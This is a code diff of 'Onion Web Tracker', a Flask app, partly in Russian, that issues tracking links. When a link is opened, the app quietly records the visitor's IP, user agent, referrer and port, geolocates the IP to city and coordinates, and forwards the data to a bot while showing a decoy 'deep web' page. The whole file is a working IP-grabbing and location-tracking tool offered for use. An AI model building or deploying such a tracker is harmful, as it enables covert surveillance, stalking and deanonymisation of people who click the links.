@@ -1,8 +1,5 @@
-import socket
-import threading
-from flask import Flask, request, render_template_string
+from flask import Flask, request
 import requests
-import json
 import random
 import string
 import time
@@ -22,84 +19,144 @@ BANNER = """
 tracking_data = {}
 active_tokens = set()
 
-def generate_url():
+def generate_token():
     chars = string.ascii_lowercase + string.digits
-    token = ''.join(random.choice(chars) for _ in range(10))
-    base_url = os.environ.get('RENDER_EXTERNAL_URL', 'https://onion-web.onrender.com')
-    return f"{base_url}/{token}"
+    return ''.join(random.choice(chars) for _ in range(15))
 
 def get_ip_info(ip):
     try:
-        response = requests.get(f"http://ip-api.com/json/{ip}")
-        data = response.json()
-        return data
+        if ip not in ['127.0.0.1', 'localhost']:
+            response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
+            data = response.json()
+            return data
+        return {}
     except:
         return {}
 
 def start_bot(info):
-    import bot
-    bot.send_info(info)
+    try:
+        from bot import send_info
+        send_info(info)
+    except Exception as e:
+        print(f"Bot error: {e}")
 
 @app.route('/')
 def index():
-    url = generate_url()
-    token = url.split('/')[-1]
+    token = generate_token()
     active_tokens.add(token)
     tracking_data[token] = None
     
-    return f"""
-    <html>
-        <head>
-            <title>Onion Web</title>
-            <style>
-                body {{ 
-                    background: #000; 
-                    color: #00ff00; 
-                    font-family: 'Courier New', monospace;
-                    text-align: center;
-                    padding: 50px;
-                }}
-                .banner {{ 
-                    font-size: 24px; 
-                    margin-bottom: 30px;
-                }}
-                .url {{
-                    background: #111;
-                    padding: 20px;
-                    border: 1px solid #00ff00;
-                    margin: 20px auto;
-                    max-width: 600px;
-                    word-break: break-all;
-                }}
-                .info {{
-                    color: #888;
-                    margin-top: 30px;
-                }}
-            </style>
-        </head>
-        <body>
-            <div class="banner">ONION WEB TRACKER</div>
+    html_content = """
+    <!DOCTYPE html>
+    <html lang="ru">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Onion Web Tracker</title>
+        <style>
+            * {
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+            }
+            body {
+                background: #000;
+                color: #00ff00;
+                font-family: 'Courier New', monospace;
+                overflow-x: hidden;
+                height: 100vh;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+            }
+            .container {
+                text-align: center;
+                padding: 30px;
+                border: 2px solid #00ff00;
+                border-radius: 10px;
+                background: rgba(0, 255, 0, 0.05);
+                max-width: 800px;
+                width: 90%;
+            }
+            .banner {
+                font-size: 24px;
+                margin-bottom: 30px;
+                text-shadow: 0 0 10px #00ff00;
+            }
+            .url-box {
+                background: #111;
+                padding: 20px;
+                border: 1px solid #00ff00;
+                margin: 20px 0;
+                word-break: break-all;
+                font-size: 18px;
+            }
+            .info {
+                color: #888;
+                margin-top: 20px;
+                font-size: 14px;
+            }
+            .pulse {
+                animation: pulse 2s infinite;
+            }
+            @keyframes pulse {
+                0% { opacity: 1; }
+                50% { opacity: 0.7; }
+                100% { opacity: 1; }
+            }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <div class="banner pulse">ONION WEB TRACKER</div>
             <div>Ваша отслеживаемая ссылка:</div>
-            <div class="url">{url}</div>
+            <div class="url-box" id="url">""" + f"https://onion-web.onrender.com/{token}" + """</div>
             <div class="info">Ссылка активна в течение 24 часов</div>
-        </body>
+            <div class="info">Все переходы будут отслеживаться и логироваться</div>
+        </div>
+        
+        <script>
+            setTimeout(() => {
+                document.querySelector('.pulse').style.animation = 'none';
+            }, 5000);
+        </script>
+    </body>
     </html>
     """
+    
+    return html_content
 
 @app.route('/<token>')
 def track_visit(token):
     if token not in active_tokens:
-        return "Not Found", 404
+        return """
+        <html>
+            <head>
+                <style>
+                    body { background: #000; color: #ff0000; font-family: monospace; text-align: center; padding: 50px; }
+                </style>
+            </head>
+            <body>
+                <h1>404 - Link Expired</h1>
+                <p>This tracking link has expired or is invalid.</p>
+                <p><a href="/" style="color: #00ff00;">Get new link</a></p>
+            </body>
+        </html>
+        """, 404
     
     ip = request.remote_addr
-    user_agent = request.headers.get('User-Agent')
-    referrer = request.headers.get('Referer')
+    user_agent = request.headers.get('User-Agent', 'Unknown')
+    referrer = request.headers.get('Referer', 'Direct')
+    
+    x_forwarded_for = request.headers.get('X-Forwarded-For')
+    if x_forwarded_for:
+        ip = x_forwarded_for.split(',')[0].strip()
     
     ip_info = get_ip_info(ip)
     
     info = {
         'ip': ip,
-        'port': request.environ.get('REMOTE_PORT'),
+        'port': request.environ.get('REMOTE_PORT', 'N/A'),
         'user_agent': user_agent,
         'referrer': referrer,
         'country': ip_info.get('country', 'N/A'),
@@ -111,10 +168,36 @@ def track_visit(token):
     
     tracking_data[token] = info
     
-    with open('onion.html', 'r', encoding='utf-8') as f:
-        html_content = f.read()
+    print(f"🔗 Tracked visit: {ip} - {token}")
     
-    return html_content
+    try:
+        with open('onion.html', 'r', encoding='utf-8') as f:
+            html_content = f.read()
+        return html_content
+    except:
+        return """
+        <html>
+            <head>
+                <title>Onion Space</title>
+                <style>
+                    body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; padding: 50px; }
+                </style>
+            </head>
+            <body>
+                <h1>Onion Space</h1>
+                <p>Welcome to the deep web...</p>
+            </body>
+        </html>
+        """
+
+@app.route('/health')
+def health():
+    return {
+        'status': 'healthy',
+        'active_tokens': len(active_tokens),
+        'tracked_visits': len([t for t in tracking_data.values() if t]),
+        'timestamp': time.time()
+    }
 
 @app.route('/admin')
 def admin():
@@ -130,65 +213,66 @@ def admin():
             <title>Admin Panel</title>
             <style>
                 body {{ background: #000; color: #00ff00; font-family: monospace; padding: 20px; }}
-                .stat {{ margin: 10px 0; }}
+                .stat {{ margin: 10px 0; padding: 10px; border: 1px solid #00ff00; }}
             </style>
         </head>
         <body>
-            <h1>Admin Panel</h1>
-            <div class="stat">Active tokens: {stats['active_tokens']}</div>
-            <div class="stat">Total tracked: {stats['total_tracked']}</div>
-            <div class="stat">Uptime: {stats['uptime']}</div>
+            <h1>🔧 Admin Panel</h1>
+            <div class="stat">🟢 Active tokens: {stats['active_tokens']}</div>
+            <div class="stat">📊 Total tracked: {stats['total_tracked']}</div>
+            <div class="stat">⏰ Uptime: {stats['uptime']}</div>
+            <br>
+            <a href="/" style="color: #00ff00;">↩ Back to generator</a>
         </body>
     </html>
     """
 
-def start_flask():
-    port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port, debug=False)
-
 def monitor_tracking():
     while True:
-        for token in list(active_tokens):
-            if tracking_data.get(token):
-                info = tracking_data[token]
-                print(f"""
-🎯 Обнаружен переход по ссылке!
+        try:
+            for token in list(active_tokens):
+                if tracking_data.get(token):
+                    info = tracking_data[token]
+                    print(f"""
+🎯 New Visit Detected!
 
-📊 Информация о сети:
-├ IP - адрес: {info['ip']}
-├ User - Agent: {info['user_agent']}
+📊 Network Info:
+├ IP: {info['ip']}
+├ User Agent: {info['user_agent'][:100]}...
 ├ Referrer: {info['referrer']}
-├ Время: {info['timestamp']}
+├ Time: {info['timestamp']}
 
-📍 Местоположение:
-├ Страна: {info['country']}
-├ Город: {info['city']}
-├ Долгота: {info['lon']}
-└ Широта: {info['lat']}
+📍 Location:
+├ Country: {info['country']}
+├ City: {info['city']}
+├ Coordinates: {info['lat']}, {info['lon']}
 """)
-                start_bot(info)
-                del tracking_data[token]
-        
-        time.sleep(1)
+                    start_bot(info)
+                    del tracking_data[token]
+            
+            time.sleep(2)
+        except Exception as e:
+            print(f"Monitor error: {e}")
+            time.sleep(5)
 
 def cleanup_tokens():
     while True:
         time.sleep(3600)
-        if len(active_tokens) > 100:
-            tokens_to_remove = list(active_tokens)[:50]
-            for token in tokens_to_remove:
-                active_tokens.discard(token)
-                if token in tracking_data:
-                    del tracking_data[token]
-            print(f"🧹 Очищено {len(tokens_to_remove)} старых токенов")
+        try:
+            if len(active_tokens) > 50:
+                tokens_to_remove = list(active_tokens)[:25]
+                for token in tokens_to_remove:
+                    active_tokens.discard(token)
+                    if token in tracking_data:
+                        del tracking_data[token]
+                print(f"🧹 Cleaned {len(tokens_to_remove)} old tokens")
+        except Exception as e:
+            print(f"Cleanup error: {e}")
 
 if __name__ == "__main__":
     print(BANNER)
     
-    flask_thread = threading.Thread(target=start_flask)
-    flask_thread.daemon = True
-    flask_thread.start()
-    
+    import threading
     monitor_thread = threading.Thread(target=monitor_tracking)
     monitor_thread.daemon = True
     monitor_thread.start()
@@ -197,14 +281,8 @@ if __name__ == "__main__":
     cleanup_thread.daemon = True
     cleanup_thread.start()
     
-    print("🚀 Сервер запущен и работает 24/7")
-    print("🌐 Доступен по адресу: https://onion-web.onrender.com")
-    print("📊 Генерация ссылок активна")
-    print("👁️  Отслеживание переходов запущено")
-    print("⏹️  Для остановки нажмите Ctrl+C")
+    port = int(os.environ.get('PORT', 5000))
+    print(f"🚀 Starting server on port {port}")
+    print("🌐 Available at: https://onion-web.onrender.com")
     
-    try:
-        while True:
-            time.sleep(1)
-    except KeyboardInterrupt:
-        print("\n🛑 Сервер остановлен")
+    app.run(host='0.0.0.0', port=port, debug=False)
